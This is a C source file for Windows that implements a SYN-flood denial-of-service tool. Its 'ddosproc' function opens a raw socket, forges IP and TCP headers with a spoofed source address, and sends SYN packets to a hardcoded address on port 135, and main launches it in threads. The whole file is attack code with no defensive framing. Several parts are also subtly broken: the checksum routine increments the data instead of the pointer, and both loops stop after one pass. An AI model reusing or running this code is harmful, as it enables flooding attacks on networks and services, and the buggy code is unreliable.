#include "stdlib.h"

#include "stdafx.h"

#include "windows.h"

#include "winsock2.h"

#include "ws2tcpip.h"



#pragma comment(lib, "ws2_32.lib")

/************************************************* include header files above ************************************************/



typedef struct tcphdr /* tcp header */

{

unsigned short th_sport; /* source port */

unsigned short th_dport; /* destination port */

unsigned int th_seq; /* sequence number */

unsigned int th_ack; /* acknowledgement number */

unsigned char th_off; /* data offset */

unsigned char th_flags; /* ACK, FIN, PUSH, RST, SYN, URG */

unsigned short th_win; /* advertised windows */

unsigned short th_sum; /* checksum */

unsigned short th_urp; /* urgent offset */

}TCPHeader;



typedef struct iphdr /* ip header */

{

unsigned char ip_hl; /* header length & version*/

unsigned char ip_tos; /* type of service */

short ip_len; /* total length */

unsigned short ip_id; /* identification */

short ip_off; /* fragment offset field */

unsigned char ip_ttl; /* time to live */

unsigned char ip_p; /* protocol */

unsigned short ip_sum; /* checksum */

unsigned int ip_src; /* soure address */

unsigned int ip_dst; /* dest address */

}IPHeader;



typedef struct usrhdr /* user define header */

{

unsigned long usr_sa; /* source address */

unsigned long usr_da; /* dest address */

unsigned char usr_mbz; 

unsigned char usr_ptl; /* protocol */

unsigned short usr_pl; /* protocol lenght */

}USRHeader;



bool ddosproc(void); /* declare ddos thread function */

unsigned short checksum(unsigned short *buffer, int length); /* declare checksum function */



/******************************************* declare structures & functions above *********************************************/



/********************************************** codes for the functions below *************************************************/



unsigned short checksum(unsigned short *buffer, int length) /* code for checksum */

{

long sum = 0; /* assume 32 bit long, 16 bit short */



while (length > 1)

{

sum += (*(unsigned short *)buffer)++;

length -= sizeof (unsigned short);

}



if (length)

{

sum += (unsigned short) * (unsigned char *) buffer;

}



while (sum >> 16)

{

sum = (sum & 0xffff) + (sum >> 16);

}



return (unsigned short)(~sum);

}



bool ddosproc(void) /* code for ddos */

{

WSADATA wsaData;

TCPHeader tcpHeader;

IPHeader ipHeader;

USRHeader usrHeader;

BOOL bFlag = TRUE;

int iRet, timeout = 6000;

int destPort = 135;

char package[MAX_PATH];

const char *destIP = "192.168.1.101";

struct sockaddr_in sock_in;


printf("Error %d\n",WSAGetLastError());


if (0 != WSAStartup(MAKEWORD(2, 2), &wsaData))

{
printf("Error %d\n",WSAGetLastError());
return false;

}



SOCKET sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);

if (INVALID_SOCKET == sock)

{
printf("Error %d\n",WSAGetLastError());
return false;

}



iRet = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) & bFlag, sizeof (BOOL));

if (SOCKET_ERROR == iRet)

{
printf("Error %d\n",WSAGetLastError());
return false;

}



iRet = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *) & timeout, sizeof (int));

if (SOCKET_ERROR == iRet)

{
printf("Error %d\n",WSAGetLastError());
return false;

}

while (true)

{

	memset(&sock_in, 0, sizeof sock_in); /* init sockaddr_in structure */

	sock_in.sin_family = AF_INET; /* socket family */

	sock_in.sin_addr.S_un.S_addr = inet_addr(destIP); /* dest address */

	sock_in.sin_port = htons((unsigned short)destPort); /* dest port */



	/* init ip header */

	ipHeader.ip_hl = (4 << 4 | sizeof(ipHeader) / sizeof(long));

	ipHeader.ip_tos = 0;

	ipHeader.ip_len = htons(sizeof(ipHeader) + sizeof(tcpHeader));

	ipHeader.ip_id = 1;

	ipHeader.ip_off = 0;

	ipHeader.ip_ttl = 128;

	ipHeader.ip_p = IPPROTO_TCP;

	ipHeader.ip_sum = 0;

	ipHeader.ip_src = htons((unsigned short)GetTickCount() * 1024);

	ipHeader.ip_dst = inet_addr(destIP); 



	/* init tcp header */

	tcpHeader.th_sport = htons((unsigned short)6666);

	tcpHeader.th_dport = htons((unsigned short)destPort);

	tcpHeader.th_seq = htons(0);

	tcpHeader.th_ack = 0;

	tcpHeader.th_off = (sizeof(tcpHeader) / 4 << 4 | 0);

	tcpHeader.th_flags = 2;

	tcpHeader.th_win = htons(5647);

	tcpHeader.th_sum = 0;

	tcpHeader.th_urp = 0;



	/* init usrdef header */

	usrHeader.usr_sa = ipHeader.ip_src;

	usrHeader.usr_da = inet_addr(destIP);

	usrHeader.usr_mbz = 0;

	usrHeader.usr_ptl = IPPROTO_TCP;

	usrHeader.usr_pl = htons(sizeof(tcpHeader));



	/* tcp checksum */

	memcpy(package, &usrHeader, sizeof(usrHeader));

	memcpy(package + sizeof(usrHeader), &tcpHeader, sizeof(tcpHeader));

	tcpHeader.th_sum = checksum((unsigned short *)package, sizeof(usrHeader) + sizeof(tcpHeader));

	memcpy(package, &tcpHeader, sizeof(tcpHeader));



	/* ip checksum */

	memcpy(package, &ipHeader, sizeof(ipHeader));

	memcpy(package + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));

	memset(package + sizeof(ipHeader) + sizeof(tcpHeader), 0, 4);

	ipHeader.ip_sum = checksum((unsigned short *)package, sizeof(ipHeader) + sizeof(tcpHeader));



	iRet = sendto(sock, package, sizeof(ipHeader) + sizeof(tcpHeader), 0, (struct sockaddr*)&sock_in, sizeof(sock_in));

	if (-1 == iRet)

	{
		printf("Error %d\n",WSAGetLastError());
		return false;

	}
	else
	{

	printf("%s", "Send OK");
	}
	break;

}

return true;

}



int main()

{
printf("Error %d\n",WSAGetLastError());
for (int i = 0 ; i < 100; i ++)

{

	HANDLE h =CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) & ddosproc, 0, 0 ,NULL);
	printf("Error %d\n",h);
	break;

}

Sleep(1000);

return 0;

}


